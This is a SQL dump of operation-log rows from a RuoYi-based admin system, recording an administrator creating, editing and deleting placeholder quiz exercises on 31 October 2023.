INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (340, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"params\":{},\"parentId\":5,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:06:12\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-31 14:06:12', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (341, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"params\":{},\"parentId\":5,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:07:37\"}', '{\"msg\":\"操作失败\",\"code\":500}', 0, NULL, '2023-10-31 14:07:37', 8);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (342, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:08:21\",\"exerciseTitle\":\"<p>asdasdasdasdqweqweqw</p>\",\"exerciseType\":1,\"id\":100,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":100}', 0, NULL, '2023-10-31 14:08:21', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (343, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"das\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:08:59\",\"exerciseTitle\":\"<p>asdasdasd</p>\",\"exerciseType\":0,\"id\":101,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":101}', 0, NULL, '2023-10-31 14:08:59', 47);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (344, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd123123</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:31:32\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:31:32', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (345, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd1231232222</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:31:35\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:31:35', 37);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (346, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd123123222211</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:33:56\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:33:56', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (347, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd123123222211asd</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:35:04\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:35:04', 12);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (348, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd123123222211asd</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:35:20\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:35:20', 39);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (349, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"哈哈哈哈\",\"choiceA\":\"das\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:09:00\",\"exerciseTitle\":\"<p>asdasdasd</p>\",\"exerciseType\":0,\"id\":101,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:37:08\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:37:08', 53);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (350, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"11\",\"choiceB\":\"3\",\"choiceC\":\"11\",\"choiceD\":\"2\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:41:17\",\"exerciseTitle\":\"<p>12332121321312312</p>\",\"exerciseType\":0,\"id\":102,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":102}', 0, NULL, '2023-10-31 14:41:17', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (351, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<p>asd123123222211asd</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:41:44\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:41:44', 71);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (352, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:42:14\",\"exerciseTitle\":\"<p>asdas</p>\",\"exerciseType\":1,\"id\":103,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":103}', 0, NULL, '2023-10-31 14:42:14', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (353, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:42:27\",\"exerciseTitle\":\"<p>hhhhh</p>\",\"exerciseType\":1,\"id\":104,\"params\":{},\"parentId\":5,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":104}', 0, NULL, '2023-10-31 14:42:27', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (354, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/9', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:48:28', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (355, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/7', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:48:31', 8);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (356, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:53:27\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:53:27', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (357, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 14:54:30\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 14:54:30', 44);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (358, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:02:41\",\"exerciseProgram\":\"<p>asd123</p>\",\"exerciseType\":-1,\"id\":6,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:02:04\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:02:05', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (359, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:02:41\",\"exerciseProgram\":\"<p>asd123hhh</p>\",\"exerciseType\":-1,\"id\":6,\"isDelete\":0,\"params\":{},\"quesType\":2,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:02:13\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:02:13', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (360, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:02:41\",\"exerciseProgram\":\"<p>asd123hhh</p>\",\"exerciseType\":-1,\"id\":6,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:02:18\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:02:18', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (361, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:05:31\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:05:31', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (362, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdhhhh\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:20\",\"exerciseTitle\":\"<p>asda111</p>\",\"exerciseType\":0,\"id\":92,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:11:24\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:11:24', 11);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (363, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdhhhh\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:20\",\"exerciseTitle\":\"<p>asda111123</p>\",\"exerciseType\":0,\"id\":92,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:13:12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:13:12', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (364, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdhhhh\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:20\",\"exerciseTitle\":\"<p>asda111123hhhhh</p>\",\"exerciseType\":0,\"id\":92,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:14:03\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:14:03', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (365, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:15:49\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:15:49', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (366, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111123</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:16:12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:16:12', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (367, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111123hhh</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:18:19\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:18:19', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (368, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdhhhh\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 20:31:20\",\"exerciseTitle\":\"<p>asda111123hhhhh123</p>\",\"exerciseType\":0,\"id\":92,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:18:28\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:18:28', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (369, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111123hhhttt</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:19:12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:19:12', 28);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (370, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 14:42:28\",\"exerciseTitle\":\"<p>hhhhhqweqw</p>\",\"exerciseType\":1,\"id\":104,\"isDelete\":0,\"params\":{},\"parentId\":5,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:19:21\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:19:22', 22);
